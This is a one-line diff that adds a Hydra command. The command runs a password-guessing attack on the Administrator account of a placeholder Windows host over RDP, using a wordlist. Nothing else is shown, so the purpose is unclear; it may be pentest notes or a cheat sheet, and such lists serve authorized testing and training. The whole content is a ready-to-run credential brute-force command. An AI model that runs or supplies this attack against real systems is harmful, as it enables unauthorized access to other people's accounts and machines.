@@ -1,0 +1,1 @@
+hydra -t 1 -V -f -l Administrator -P /path/to/wordlist.txt rdp://<windows-ip>
